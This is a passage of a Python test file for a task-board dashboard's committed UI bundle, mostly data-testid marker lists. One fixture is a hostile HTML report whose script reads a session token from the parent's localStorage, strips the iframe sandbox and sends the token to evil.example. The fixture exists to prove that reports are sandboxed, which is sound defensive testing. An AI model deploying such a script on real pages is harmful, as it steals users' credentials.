"""The UI, run for real.

The page is a React bundle now, built from `ui/` by `ui/build.mjs` and COMMITTED
to `src/taskops/ui/`. It is tested from both ends, and the two tests below are
those two ends:

1. `test_the_pages_draw_the_board_and_the_dossier` builds a real board with
   `LocalBoard`, hands the server's own `board` and `card` payloads to
   `ui/smoke/run.mjs`, and that harness renders the very modules `src/main.tsx`
   bundles — through `react-dom/server`, with no browser and no jsdom. What it
   proves is the list this file has always been: the nine Monitor panes, a
   pane with no verb showing its empty state instead of a zero, the Board's
   columns, the acceptance criteria in the dossier (the hole v1 never closed),
   the comment box posting `update` and nothing else, the draft surviving a
   refusal, and Escape closing the top-most overlay only.

2. `test_the_committed_bundle_carries_the_dashboard` reads the COMMITTED bundle
   itself. The first test runs the source; this one is what notices that
   `src/taskops/ui/app.js` is not that source's output — a `pip install
   taskops` serves these bytes and nothing else, so a pane missing HERE is a
   pane missing in production. Its whole-tree counterpart is `npm run check`,
   whose `git diff --exit-code ../src/taskops/ui` clause fails on any drift.

`node` runs the harness because it is what runs JavaScript, and the harness
compiles TypeScript with the project's own esbuild — so it needs
`ui/node_modules` (`npm ci` in `ui/`, twelve packages, gitignored). Missing
either, the first test SKIPS rather than pretending; the second needs neither
and always runs.

Every wave of `.tsx`-only cards rebuilt into that bundle left its own row of
markers below, and `markers` in the second test is their concatenation — the
rows are the enumeration, so counting them here would be a number that rots
(it had, twice, before `PROSE` and `REPORTS` were added). The rows, oldest
first: `VIEWS` (tk-fadcdc — the Worktrees tab,
the milestone picker, the Chapter pane's criteria), `GITHUB_VISIBLE` (tk-0bc9fa
— the GitHub anchors, a commit's `+/-`, the Event stream's real rows and pager,
the dev carrying a worktree, the picker's landed chapters), `OWN_CLONE`
(tk-e5a340 — Files changed and the four steps of the diff cascade) and
`WORKTREES_PR` (tk-b9c857 — the two-column index and the full-width diff page
that replaced the five-column table) and `SIDE_BY_SIDE` (tk-d0fc41 — the second
close of that same chapter: the page read side by side, with the card's own
thread on it, and Monitor's ninth pane) and `NOTHING_DRAWN` (tk-81c980 — a
column with nothing in it is not drawn at all, which is the one wave that also
RETIRED a marker of its own: see `RETIRED`) and `CHAPTERS_LISTED` (tk-13d115 —
several open chapters listed as foldable rows instead of apologised for, which
also retired a sentence: see `RETIRED_APOLOGY`) and `CLOSING_NOTE` (tk-a1b7f2 —
a close's transition and the note the worker signed off with) and `ACTORS`
(tk-5fc887 — the fourth view as a page about DEVS; it also RETIRED the six
markers of the draft it replaced) and `DATE_PANES` (tk-36b550 — the SECOND
redesign of what a dev opens into: a pane per calendar day with an hour that
folds open, which retired the lane-per-agent drawing and the hours bar panel
whole: see `RETIRED_TIMESHEET`) and `PROSE` (tk-382948 — the one markdown renderer) and
`REPORTS` (tk-535807 — the Reports tab and the sandboxed frame) and `FORGE_SAID`
(tk-5c64d5 — the one line saying which forge opens this board). Every list is
the check that the bundle is the CURRENT source's output and not the previous
wave's: none of those strings existed in the bundle its chapter-close replaced,
so a close that forgot to run `node build.mjs` fails here.

The one marker that had to be RETIRED rather than added is the Event stream's
`"no events verb"`. It was true while nothing returned the log; `verbs/events.py`
made it false, so this file asserts its ABSENCE — an empty pane now means an
empty log and says so.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from typing import Any
from pathlib import Path

import pytest

from taskops import _clock
from taskops.board import LocalBoard
from tests.conftest import T0

ROOT = Path(__file__).resolve().parent.parent
UI = ROOT / "ui"
HARNESS = UI / "smoke" / "run.mjs"
BUNDLE = ROOT / "src" / "taskops" / "ui"

#: The NINE panes Monitor draws — `ui/src/components/monitor/panels.ts`.
#:
#: `pane-swarm` is the ninth and the newest. It was added to the smoke harness's
#: own list by the card that built it (tk-74ace0) and deliberately NOT here,
#: because this tuple is asserted against the COMMITTED bundle and no card of
#: that wave was allowed to rebuild it — the marker would have been red from the
#: moment it was written until this close. It is here now, after the rebuild.
PANES = (
    "pane-leases",
    "pane-throughput",
    "pane-health",
    "pane-dag",
    "pane-files",
    "pane-chapter",
    "pane-mentions",
    "pane-events",
    "pane-swarm",
)

#: What only the FINISHED code emits — the markers a stub never carried.
#:
#: A subtitle proves nothing here: the eight pane stubs shipped with Nova's
#: subtitle strings already in them, so `PANES` alone passes against a bundle
#: built before any panel had content. Each of these is a `data-testid` that
#: exists in exactly one component written by this wave, and none of the five
#: is in the bundle this chapter-close rebuilt over.
#:
#: `worktree-commits` was a fifth marker here and is deliberately NOT: the
#: worktrees-as-pull-requests chapter rebuilt that view as two columns of tiles
#: and the per-branch commit CELL does not exist any more (it drew an em dash —
#: `WorktreeRow.commits` has never had a source). A marker for a deleted element
#: would fail the next rebuild and say nothing about the bundle. What it did for
#: this list — one string per card of the wave — the four below still do, and
#: the chapter that retired it paid its debt in `WORKTREES_PR`.
VIEWS = (
    "worktrees",  # the third tab (pages/Worktrees.tsx)
    "milestone-menu",  # the header's picker, open (chrome/MilestonePicker.tsx)
    "chapter-criteria",  # the chapter's criteria list (monitor/Chapter.tsx)
    "standing",  # Live leases' three-figure empty state
)

#: What the GITHUB-VISIBLE chapter added, on the same terms as `VIEWS`: each is
#: a `data-testid` written by exactly one card of that wave, and none of the six
#: is in the bundle this chapter-close rebuilt over. They are the markers that
#: say the bundle is THIS chapter's output — the anchors (`links.tsx`), the
#: per-file +/- of a commit event, the Event stream's real rows and its pager,
#: the dev who carries a worktree, and the landed chapters in the picker.
GITHUB_VISIBLE = (
    "commit-link",  # the sha, linking to github.com/<slug>/commit/<sha>
    "chapter-compare",  # the chapter's own diff
    "worktree-compare",  # the same link from the Worktrees table
    "event-numstat",  # the +/- a commit event now carries
    "event-more",  # the Event stream's keyset pager
    "worktree-owner",  # the dev carrying the tree
    "milestone-landed",  # the picker's landed-chapters section
)

#: What the OWN-CLONE chapter added — the Files-changed section and the patch
#: renderer, on the same terms as the two rows above: every one of the twelve is
#: a `data-testid` written by exactly one card of this wave (`links.tsx`'s
#: cascade drawn by `components/card/Patch.tsx`), and none of them is in the
#: bundle this chapter-close rebuilt over. They are also the four steps of the
#: cascade, so a rebuild that lost the fallback path — not just the happy one —
#: fails here too.
OWN_CLONE = (
    "files-changed",  # the card as a PR: the file list
    "changed-file",  # one row of it, foldable
    "changed-none",  # …and the range where nothing differs
    "patch",  # the unified diff itself
    "patch-empty",  # a range whose patch text is empty
    "patch-loading",  # step 1: reading the diff from this host's clone
    "patch-forge",  # step 3: no clone here — read it on the forge
    "patch-forge-link",
    "patch-none",  # step 4: no clone, no slug, one honest sentence
    "patch-truncated",  # a cut patch SAYS it was cut…
    "patch-truncated-link",  # …and offers the whole of it when it can
    "patch-toggle",  # the fold on a commit row
)

#: What the WORKTREES-AS-PULL-REQUESTS chapter added, on the same terms again:
#: the five-column table is gone and with it `worktree-commits` (see `VIEWS`),
#: so this row is what says the bundle carries the two screens that replaced it
#: — the two-column index with its sub-blocks and resolved chapter line, and the
#: second surface, a FULL-WIDTH diff page with its own chrome. None of the nine
#: is in the bundle this chapter-close rebuilt over; the last two are in it as
#: LITERALS even on a board with no slug and no clone, where neither can ever be
#: drawn — which is exactly what a byte-level check can say and a render cannot.
WORKTREES_PR = (
    "worktree-column",  # the index is two columns, In progress and Merged
    "worktree-block",  # …each split into its sub-blocks
    "worktree-chapter",  # the row's chapter, resolved to its title
    "worktree-diff",  # the second surface: the tree as a pull request
    "worktree-diff-back",  # the only way out of it
    "worktree-diff-range",  # base ← head
    "worktree-diff-dir",  # where the tree is on disk
    "worktree-diff-forge",  # …and out to the forge, when the board has a slug
    "files-changed-summary",  # the bar the diff PAGE adds to the file list
)

#: What the SECOND close of that same chapter added — the wave after `WORKTREES_PR`
#: landed, on the same terms once more. The index and the page existed; this wave
#: made the page READ like one (side by side, the card's own thread on it) and gave
#: Monitor its ninth pane. Every one of these nine is a `data-testid` written by
#: exactly one card of the wave, and none of them is in the bundle this close
#: rebuilt over — checked marker by marker against the previous `app.js` before
#: this list was written.
SIDE_BY_SIDE = (
    "patch-split",  # the diff, two columns
    "patch-split-row",  # …one paired line of it
    "worktree-diff-mode",  # unified ↔ split, on the page only
    "worktree-diff-thread",  # the CARD's thread, on the tree's page
    "swarm-graph",  # the ninth pane's ring
    "swarm-node",  # an actor or a card on it
    "swarm-edge",  # a lease, a lapsed lease, or a contested path
    "swarm-legend",  # the four actor kinds, as the mock draws them
    "swarm-count",  # nodes, and how many edges are contested
)

#: The THIRD close of that chapter, and it is one marker because it is one
#: decision reversed: a column with nothing in it is no longer drawn at all, so
#: the per-column empty state goes with the shells that carried it and the ONE
#: surviving sentence — both columns empty — is a message centred in the page.
#:
#: Both halves are asserted, and that is the point of a byte-level check here: a
#: rebuild that forgot this card would carry `worktrees-empty` and not
#: `worktrees-none`, and a source tree that kept the old empty state alongside
#: the new one would carry both. Only the swap passes.
NOTHING_DRAWN = ("worktrees-none",)  # the both-empty message, centred in the page

#: …and what the same change REMOVED. `worktrees-empty` was the dotted field
#: inside a column shell; it was in the bundle this close rebuilt over (checked),
#: and it must not be in the one that replaces it.
#:
#: The ACTORS row below retired six more, and for the same shape of reason: the
#: first draft of that page drew one tile per ACTOR with the detail revealed in
#: place, and tk-5fc887 replaced both with a dev card and a real overlay. A
#: source tree that kept the old page beside the new one would carry both sets,
#: so only the swap passes. `timesheet-cards` is the one this card exists for —
#: it is the list of card ids joined by dots that stood where a drawing belongs.
RETIRED = (
    "worktrees-empty",
    # The card modal's forge `compare ↗`, replaced by `card-open-tree` below.
    # It was in the bundle this rebuilt over (checked), so only the swap passes:
    # a tree that kept both would be a source tree with two answers to "where
    # does the Worktree block send the reader".
    "card-compare",
    "actor-card",  # one tile per ephemeral sub-agent: sixty-seven of them
    "actor-card-open",
    "actor-pill",
    "actor-carried",
    "actor-history",
    "actor-timesheet-toggle",  # the in-place reveal, replaced by a full overlay
    "timesheet-cards",  # THE DEFECT: a timesheet drawn as a list of ids
)

#: The SEVENTH wave, and it is the Chapter pane's (tk-13d115). `_facts.in_scope`
#: returns None for SEVERAL open chapters as well as for none — it refuses to
#: guess — and the pane read that refusal as a fault: a paragraph telling the
#: reader to close one, and nothing at all about either chapter. It now lists
#: every OPEN chapter, one foldable row each, first expanded, each row's `focus`
#: calling the header picker's own setter.
#:
#: Both halves again, and here the retired half is a SENTENCE rather than a
#: `data-testid`: the apology is what this card deleted, it was in the bundle
#: this close rebuilt over (checked), and a rebuild that missed this card would
#: carry it.
CHAPTERS_LISTED = (
    "chapter-row",  # one open chapter, one row
    "chapter-fold",  # …a real button with aria-expanded, not an arrow glyph
    "chapter-open-count",  # how many open cards it carries, folded from the rows
    "chapter-focus",  # the door to the header picker's own setter
)

#: …and what it removed: the apology for a board that is merely working.
RETIRED_APOLOGY = ("Land or drop the finished ones",)

#: The EIGHTH wave's, and it is the thread's (tk-a1b7f2). A `status` event was
#: drawn as the bare word "done": `Thread.tsx::detail` tried body keys in an
#: order that reached `to` and never `reason`, and the render drew a text block
#: only for a comment. Every close note in the log — 61 of 61 on this board —
#: was on the wire and off the screen. The thread now draws a PHRASE and, under
#: it, the PROSE, and these are the two `data-testid`s that split.
#:
#: It was written OUTSIDE the `markers` tuple by the card that earned it, for
#: exactly the reason `PANES` records for `pane-swarm`: that wave's cards are
#: `.tsx`-only and none of them may rebuild `src/taskops/ui/`, so the assertion
#: would have been red from the moment it was written until the chapter-close
#: rebuild. tk-56740f is that rebuild, and both strings are asserted now.
CLOSING_NOTE = (
    "event-detail",  # the transition, the field, the verdict — the phrase
    "event-prose",  # …and the writing underneath it
)

#: The NINTH wave, and it is this chapter's own: ACTORS, the fourth view. It
#: shipped once as a grid of ACTOR tiles with an in-place reveal, and tk-5fc887
#: reversed both — sixty-seven tiles for sixty-six dead sub-agents is not a page
#: about who has been on this board — so these markers are that page's, not the
#: first draft's: `dev-card` where `actor-card` was, `dev-open` where
#: `actor-timesheet-toggle` was.
#:
#: What the row is really pinning is the chapter's refusal (ARCHITECTURE.md §11):
#: an actor is a name bound to the run of a card, so the bundle carries a dev's
#: own figures and the days it worked INSTEAD of a held/free/lapsed slot roster.
#: `actors-none` is the empty board's one sentence rather than an empty grid.
ACTORS = (
    "actors",  # the fourth tab (pages/Actors.tsx)
    "dev-card",  # ONE card per dev — the durable identity, never per agent
    "dev-live",  # how many of its agents are on a card RIGHT NOW, unopened
    "dev-recent",  # the most recent few agents, and the rest as a count
    "dev-open",  # the door into the full overlay (components/actors/DevPanel.tsx)
    "actors-none",  # a board nobody has touched: one sentence
)

#: The TENTH wave, and it is the SECOND redesign of that same panel (tk-36b550).
#: What a dev opened into was a DRAWING — one lane per agent on a shared
#: wall-clock axis — with a panel of hour BARS beside it on the page. Both
#: existed to compare actors against each other, and an ephemeral agent is a
#: label: `w1` today is not `w1` yesterday, which is this chapter's own goal. So
#: neither was restyled; both were deleted.
#:
#: What replaced them answers the one question the panel can answer honestly —
#: WHEN did the work happen: a pane per calendar day, NEWEST FIRST and only the
#: newest open, each day's hours a row, each row folding open to its sessions.
#: An hour with nothing counted is drawn and says so, because that is where the
#: dropped gaps are.
#:
#: Both halves are asserted, as every redesign row here is: these strings are the
#: new panel's, `RETIRED_TIMESHEET` below is the old one's, and a source tree
#: that kept one beside the other would carry both. Only the swap passes.
DATE_PANES = (
    "daysheet",  # the panel (components/actors/Daysheet.tsx)
    "day-pane",  # ONE PANE PER DATE, newest first
    "day-fold",  # …a real button with aria-expanded, not an arrow glyph
    "day-total",  # that day's counted time
    "day-dropped",  # the gaps: how many, and the wall-clock they hold
    "hour-row",  # every hour the day spans — including one with nothing in it
    "hour-fold",  # the second fold, and only where there is something behind it
    "hour-total",  # the time counted inside that hour
    "hour-cards",  # the cards it touched, or `nothing counted`
    "session-row",  # HH:MM – HH:MM, the duration, the card — a door to its dossier
    "daysheet-none",  # nothing counted in the window: one sentence
    "daysheet-rule",  # the arithmetic, in core/hours.py's own words
    "dev-figures",  # the rail: worked, commits, cards, who is running now
)

#: …and what that redesign REMOVED. Every one of these was in the bundle this
#: close rebuilt over (checked, one at a time), and none may be in the one that
#: replaces it: the lanes and their axis, the per-agent rows under them, and the
#: bar panel on the page.
RETIRED_TIMESHEET = (
    "timesheet",  # the drawing itself
    "timesheet-lane",  # ONE LANE PER AGENT: the comparison this card refuses
    "timesheet-lane-total",
    "timesheet-axis",
    "timesheet-ruler",
    "timesheet-tick",
    "timesheet-block",
    "timesheet-gap",
    "timesheet-range",
    "timesheet-dropped",
    "timesheet-capped",
    "timesheet-none",
    "timesheet-rule",
    "dev-agent",  # a row per sub-agent — an agent is not a subject here
    "dev-agents",
    "dev-agents-none",
    "dev-agents-more",
    "dev-agent-state",
    "dev-agent-card",
    "dev-agent-history",
    "pane-hours-today",  # THE UGLY ONE: a bar chart comparing labels
    "hours-dev",
    "hours-bar",
)

#: The EIGHTH wave, and it is one card (tk-382948): every screen that draws
#: prose routes through the one renderer. Two markers, on the same terms as the
#: rows above — neither is in the bundle this close rebuilt over.
#:
#: `chapter-goal` is the goal's own scroll box, which exists because the goal is
#: blocks now; `markdown-inline` is the renderer's second mode, the one a rule, a
#: criterion, a mention row and a tile note are drawn in. A rebuild that carried
#: the fix for the goal and not the fix for the lists would fail on the second.
PROSE = (
    "chapter-goal",  # the goal, rendered and scrolled, never cut
    "markdown-inline",  # the ONE renderer's spans-only mode
)

#: The REPORTS chapter's row (tk-535807), on the same terms as every row above:
#: each is a `data-testid` written by exactly one card of the wave, and none of
#: the ten is in the bundle this chapter-close rebuilt over — checked one at a
#: time against `git show HEAD:src/taskops/ui/app.js` before this list existed.
#:
#: It was written OUTSIDE the wave's own cards for the reason `PANES` records
#: for `pane-swarm`: those cards are `.tsx`-only and none of them may rebuild
#: `src/taskops/ui/`, so every assertion here would have been red from the
#: moment it was written until this rebuild.
#:
#: Both ENDS of the fifth tab are in it: the index (`reports`, `report-row`) and
#: the page (`report-page`, `report-back`, `report-source`), and both branches of
#: `ReportFrame` — the sandboxed iframe an html report is read in
#: (`report-frame`) and the `<pre>` a `text/plain` one is drawn in
#: (`report-text`), because `srcdoc` parses as HTML and text is not markup. The
#: three empty/limit states are here too, since a report list that has nothing
#: to say must say so rather than draw a zero.
REPORTS = (
    "reports",  # the FIFTH tab (pages/Reports.tsx)
    "report-row",  # one filed report in the index
    "report-page",  # …opened, full width
    "report-frame",  # the SANDBOXED iframe an html report is read in
    "report-text",  # …and the text/plain branch, which is never framed
    "report-truncated",  # a cut report SAYS it was cut
    "report-none",  # the door served nothing for this path at this sha
    "reports-none",  # the chapter has no reports: one sentence, not an empty list
    "report-source",  # the path and sha the bytes were read at
    "report-back",  # the only way out of the page
)


#: One card, one marker (tk-5c64d5): a board SAYS which forge opens it.
#:
#: `board-forge` is the header line under the board's own identity, drawn from
#: `BoardPayload.forge` — the key `verbs/pulse.py` derives per read and sends
#: ONLY when a forge was declared. Until it existed the fact was visible to the
#: owner who declared it and to the stranger the door refused, and to nobody
#: else; the dashboard could not draw what it could not read.
#:
#: The testid is `board-forge` and not `forge` because `"forge"` is ALREADY in
#: the committed bundle — it is a step name in the diff cascade
#: (`card/Patch.tsx`) — so a marker called that would assert nothing about this
#: card and would have been green against the bundle it was written over. It was
#: checked the way every row here is: `grep -c '"board-forge"'` against
#: `git show HEAD:src/taskops/ui/app.js` before this list was written. Zero.
#:
#: It is a single string rather than a tuple of two because the second half of
#: this card's screen — that an invite-only board draws NO such line — cannot be
#: an assertion about bytes: absence of a testid in the bundle is what a missing
#: feature looks like too. That half is pinned on the rendered markup, where it
#: means something (`ui/smoke/sections/forge-opens-the-board.tsx`).
FORGE_SAID = ("board-forge",)  # what opens this board, under who we are

#: A chapter goal with real markdown in it — the bug this chapter exists for.
#:
#: NOT invented: it is an excerpt of the goal the migrated axion board actually
#: carries (4.252 characters, read off `board` on the live server, 2026-08-08),
#: cut to the four constructs that were printing literally on screen — bold, a
#: `###` heading, inline code and a bullet list. A fixture that said
#: "**bold**\n\n- item" would pin the parser; this one pins the SCREEN, because
#: it is shaped like the thing the reader complained about.
MARKDOWN_GOAL = """**La máquina, y el menú que ya está lleno.**

De cualquier feature a un veredicto **pre-registrado** en una llamada — eso es
la imprenta (`LA IMPRENTA ·1` a `·12`).

### Dónde está el frente hoy (actualizado 2026-08-05)

- `#103 etfflow_regime` — REJECT. El veto paga peaje de transacción para comprar nada.
- `#96 mlrank` — deuda fechada CONTRA EL RELOJ DEL TRIAL, con `tk-21a340` de prerequisito.

Y el límite que ninguna card mueve: la restricción que ata es el **nivel de Sharpe**."""

#: Two rules. The first is verbatim off this repo's own board (the Nova
#: chapter's), because a rule carrying a code span is the ordinary case and not a
#: contrived one — nine of the ten rules with backticks in this board's log are
#: shaped exactly like it.
#:
#: The second is another of them with the number a human types when they are
#: writing a list into a list. That is the whole reason it is here: handed to the
#: BLOCK renderer, `1. …` becomes an `<ol>` — a second numbering inside a tile
#: that already draws its own, which is criterion 2 failing.
MARKDOWN_RULES = [
    "Dev source in ui/, build with `node build.mjs` FROM ui/, and the rebuilt bundle"
    " in src/taskops/ui/ IS committed.",
    "1. The feed socket is a signal, not data: never render from a frame.",
]


#: A report with a HOSTILE script in it, committed for real.
#:
#: The chapter's fourth acceptance criterion is that a report with a `<script>`
#: tag cannot read the dashboard's token, and a fixture that carried harmless
#: HTML would pin nothing: the assertion is that these exact bytes reach the
#: reader as an iframe's `srcdoc` under a sandbox with no `allow-same-origin`,
#: so the script is loaded, runs in an OPAQUE origin, and finds no parent to
#: read. Every line of it is something a real attacker would try — the token in
#: `localStorage`, the parent document, and stripping the sandbox attribute off
#: the frame from inside it.
A_HOSTILE_REPORT = """<!doctype html>
<html><body>
<h1>Chapter panorama</h1>
<p>Twelve cards, four workers, one bundle rebuild.</p>
<script>
  const stolen = parent.localStorage.getItem("taskops:http://localhost:7777");
  parent.document.title = stolen;
  window.frameElement.removeAttribute("sandbox");
  fetch("https://evil.example/" + stolen);
</script>
</body></html>
"""

#: The other half of the door's `content_type`: a report that is NOT html. It
#: must reach the screen as TEXT — the `<script>` in it drawn as the eight
#: characters it is — and never as markup, which is what the `text/plain` branch
#: of `ReportFrame` exists for.
A_TEXT_REPORT = """# Field notes

The importer landed. `<script>alert(1)</script>` was in the CSV and is prose here.
"""


def a_clone(root: Path) -> Path:
    """A real two-branch repo, so the /git door has something true to answer.

    Built here rather than mocked for the same reason `tests/test_git.py` builds
    one: git is the point. `main` moves after the branch is cut, which is what
    makes merge-base(main, feature) → feature a different answer from `main
    ..feature` and keeps the compare honest.

    The two REPORT files are committed in the FIRST commit on purpose. They are
    then on both sides of merge-base(main, tk-a11111) → tk-a11111, so the
    compare's `stat` is still exactly `pdf.py` and `tax.py` — the shape
    `ui/smoke/sections/git-diff.tsx` pins — while the file door has something
    real to serve at a rev.
    """
    from taskops.gitwork import run

    root.mkdir(parents=True)
    run.must("init", "-q", "-b", "main", str(root))
    run.must("config", "user.email", "test@example.com", cwd=root)
    run.must("config", "user.name", "Test", cwd=root)
    (root / "tax.py").write_text("RATE = 0.22\n", encoding="utf-8")
    filed = root / ".taskops" / "reports"
    filed.mkdir(parents=True)
    (filed / "panorama.html").write_text(A_HOSTILE_REPORT, encoding="utf-8")
    (filed / "notes.md").write_text(A_TEXT_REPORT, encoding="utf-8")
    run.must("add", "-A", cwd=root)
    run.must("commit", "-q", "-m", "first", cwd=root)
    run.must("checkout", "-q", "-b", "tk-a11111", cwd=root)
    (root / "tax.py").write_text("RATE = 0.22\nREDUCED = 0.10\n", encoding="utf-8")
    (root / "pdf.py").write_text("def render() -> None: ...\n", encoding="utf-8")
    run.must("add", "-A", cwd=root)
    run.must("commit", "-q", "-m", "the reduced rate", cwd=root)
    return root


def a_diff(root: Path) -> dict[str, Any]:
    """The /git door's OWN answers — the payload half of this chapter.

    All THREE cases come from `http/gitdoor.py::answer`, not from
    `gitwork/diff.py` directly and not from a shape written by hand: the words of
    the no-repo refusal are what `links.tsx::noteGitRefusal` matches on and the
    words of the stale-clone refusal are what the cascade QUOTES, so a smoke test
    that invented either would pass while the real cascade never flipped.

    The third one is the everyday case on a shared board: `tk-b22222` is another
    dev's card, whose branch is on the server's board and on origin but has never
    been fetched into this clone.

    `file`, `text_file` and `not_a_report` are the same three ends for the FILE
    question (tk-9ebbc3): the bytes of an html report and of a text one, both
    with their `content_type` decided by the door and not by the reader, and the
    door's own refusal of a path that is not a report. The refusal travels for
    the same reason `no_repo` does — it is what the Reports page QUOTES when
    there is nothing to draw, and a sentence written by hand here would pass
    while the real one never reached a screen.
    """
    from taskops.http import gitdoor
    from taskops._errors import NotFound, BadRequest

    clone = a_clone(root)
    compare = gitdoor.answer(clone, "compare/main...tk-a11111", "")
    try:
        gitdoor.answer(None, "compare/main...tk-a11111", "")
    except NotFound as refusal:
        no_repo = str(refusal)
    else:  # pragma: no cover - the door must refuse a host with no repo
        no_repo = ""
    try:
        gitdoor.answer(clone, "compare/main...tk-b22222", "")
    except NotFound as refusal:
        stale = str(refusal)
    else:  # pragma: no cover - the door must refuse a ref this clone lacks
        stale = ""
    try:
        gitdoor.answer(clone, "file/main", "path=tax.py")
    except BadRequest as refusal:
        not_a_report = str(refusal)
    else:  # pragma: no cover - the door is not a file server
        not_a_report = ""
    return {
        "compare": compare,
        "no_repo": no_repo,
        "stale": stale,
        "file": gitdoor.answer(clone, "file/main", "path=.taskops/reports/panorama.html"),
        "text_file": gitdoor.answer(clone, "file/main", "path=.taskops/reports/notes.md"),
        "not_a_report": not_a_report,
    }


needs_node = pytest.mark.skipif(
    shutil.which("node") is None or not (UI / "node_modules").is_dir(),
    reason="the harness needs node and `npm ci` in ui/",
)


def a_closed_pair(root: Path) -> list[dict[str, Any]]:
    """Two cards the board actually CLOSED, and the payloads it answers with.

    Its OWN board, and that is the point of the function rather than two more
    rows in `a_board`: nothing on the fixture board is done or integrated, and
    several assertions in `ui/smoke/sections/worktrees-index.tsx` are about exactly that shape (a
    Merged column with no rows is not drawn at all). A closed card there would
    have quietly changed what those assertions are looking at.

    Every string here is written by the SERVER onto a real event body —
    `submitted.note`, `reviewed.note`, `status.reason`, `status.no_code` — and
    §9 of the harness proves each one reached the screen. The first card takes
    the long way round (handed in, judged, closed) so its history carries all
    three kinds; the second closes with NO code, which is the other body key a
    reader should not have to open the log to learn about.
    """
    dev = LocalBoard(root, "dev:berna")
    cards = dev.call(
        "plan",
        {
            "milestone": "the importer",
            "goal": "read a bank CSV",
            "tasks": [
                {"title": "the CSV reader", "spec": "read the bank CSV", "review": True},
                {"title": "the changelog", "spec": "write it"},
            ],
        },
    )["cards"]
    worker = LocalBoard(root, "agent:berna/w2")
    reviewed, no_code = cards[0]["id"], cards[1]["id"]

    worker.call("take", {"task": reviewed})
    worker.call("bind", {"task": reviewed, "sha": "c0ffee11", "subject": "feat: csv"})
    worker.call(
        "update", {"task": reviewed, "status": "review", "comment": "parsed with Decimal throughout"}
    )
    dev.call(
        "review",
        {"task": reviewed, "verdict": "pass", "note": "read every row, the rounding holds"},
    )
    worker.call(
        "update",
        {"task": reviewed, "status": "done", "comment": "closed after the pass — Decimal all the way"},
    )

    worker.call("take", {"task": no_code})
    worker.call(
        "update",
        {
            "task": no_code,
            "status": "done",
            "no_code": True,
            "comment": "the README already said it, so there was nothing to write",
        },
    )
    payloads = [dev.call("card", {"task": reviewed}), dev.call("card", {"task": no_code})]
    dev.close()
    worker.close()
    return payloads


def a_board(root: Path) -> dict[str, Any]:
    """A board with something of every kind on it, and the payloads it answers with.

    The fixture is the SERVER'S OWN answer, never a hand-written shape: a UI that
    renders a payload the board would never send is a UI that renders nothing in
    production. `expect` and `expect_board` travel with it — this side names the
    strings it put on the board, the harness proves they reached the screen.
    """
    # The clone FIRST: the reports registered below point at the very shas and
    # paths this answer carries, so the fixture's list and the fixture's bytes
    # are one fact rather than two that can drift.
    answers = a_diff(root.parent / "clone")
    dev = LocalBoard(root, "dev:berna")
    planned = dev.call(
        "plan",
        {
            "milestone": "MVP facturador",
            "goal": MARKDOWN_GOAL,
            "rules": MARKDOWN_RULES,
            "criteria": ["Every number is a Decimal — `float` appears nowhere"],
            "tasks": [
                {
                    "title": "VAT",
                    "spec": "the whole tax",
                    "files": ["src/tax.py"],
                    "labels": ["backend"],
                },
                {
                    "title": "the reduced rate",
                    "parent": 0,
                    "spec": "10% for food",
                    # The second one is verbatim off THIS repo's own board — a
                    # criterion with a code span in it is the ordinary case, not
                    # a contrived one, and it is what pins criterion 2.
                    "criteria": [
                        "Decimal, never float",
                        "WHEN `npm run typecheck` runs in ui/ THEN it passes strict",
                    ],
                    "files": ["src/tax.py"],
                },
                {"title": "PDF", "spec": "render", "files": ["src/pdf.py"], "after": 1},
            ],
        },
    )
    cards = planned["cards"]
    dev.call("assign", {"tasks": [cards[0]["id"]]})
    worker = LocalBoard(root, "agent:berna/w2")
    worker.call("take", {"task": cards[1]["id"]})
    worker.call("bind", {"task": cards[1]["id"], "sha": "a3f9c21b", "subject": "feat: rates"})
    worker.call(
        "update",
        {
            "task": cards[1]["id"],
            # A comment quoting code is the ordinary case on this board, and it
            # is what says the mentions pane reads the same markdown the thread
            # does — it used to print the backticks (tk-382948).
            "comment": "Decimal or float? `round()` truncates",
            "mentions": ["dev:berna"],
        },
    )
    worker.call(
        "update",
        {
            "task": cards[1]["id"],
            "status": "released",
            # A released note is prose an agent wrote in a hurry, and it quotes
            # code — this is the shape every real one on this board has.
            "comment": "got to the rounding — see `src/tax.py::half_up`",
        },
    )

    # A chapter that already LANDED, and its own board payload. Built by the
    # server, like everything else here: `plan`, then `merged milestone=` — the
    # verb the orchestrator's own landing goes through (`verbs/record.py`), which
    # is what writes `status: "landed"` through the fold. It is landed
    # immediately so the board is left with exactly one OPEN chapter and every
    # other assertion in this file sees the payload it always saw.
    past = dev.call(
        "plan",
        {
            "milestone": "Nova, panel by panel",
            "goal": "the dashboard, pane by pane",
            "rules": ["ts-only diffs, the chapter-close rebuilds"],
            "criteria": ["every pane is filled"],
            "tasks": [{"title": "the Chapter pane", "spec": "goal, rules, branch"}],
        },
    )
    dev.call("merged", {"milestone": past["milestone"]["id"], "into": "main", "sha": "beef1234"})

    # TWO REPORTS on the open chapter, registered through the board's own write
    # door (`verbs/filed.py`) — never a hand-written row, for the reason the rest
    # of this fixture is the server's answer. `path` and `sha` are the door's, so
    # the list on screen and the bytes behind it name the same file at the same
    # commit, which is exactly the pair a reader composes into a /git route.
    # `milestone=` is named rather than left to the single-open-chapter bargain:
    # this board has a landed chapter too, and a fixture should not depend on
    # which one `_facts.open_milestone` resolves.
    for answer, title in (
        (answers["file"], "Chapter panorama — twelve cards, end to end"),
        (answers["text_file"], "Field notes from the importer"),
    ):
        dev.call(
            "filed",
            {
                "milestone": planned["milestone"]["id"],
                "path": answer["path"],
                "title": title,
                "sha": answer["rev"],
            },
        )

    # What OPENS this board, through the board's own write door like everything
    # else here (`verbs/project.py`, `op=forge`). The header draws it off the
    # payload key `pulse.py` derives; a fixture that hand-wrote that key would
    # prove the dashboard renders a shape the server may never send, which is
    # the one thing this file exists not to do.
    dev.call("project", {"op": "forge", "repo": "cloudacio/Axion", "need": "admin"})

    fixture: dict[str, Any] = {
        # `window=` is what makes `hours` exist at all (verbs/pulse.py::run), and
        # `useBoard` passes it on every call so Throughput draws real bars.
        "board": dev.call("board", {"window": "14d", "tz": "UTC"}),
        # The SAME verb, focused on the chapter that landed — the read that used
        # to be unreachable, since `milestones` sent only the open ones and the
        # picker could not name this id.
        "board_landed": dev.call(
            "board", {"milestone": past["milestone"]["id"], "window": "14d", "tz": "UTC"}
        ),
        # What the landed chapter must still be able to say for itself.
        "expect_landed": [
            "Nova, panel by panel",
            "the dashboard, pane by pane",
            "ts-only diffs, the chapter-close rebuilds",
            "every pane is filled",
        ],
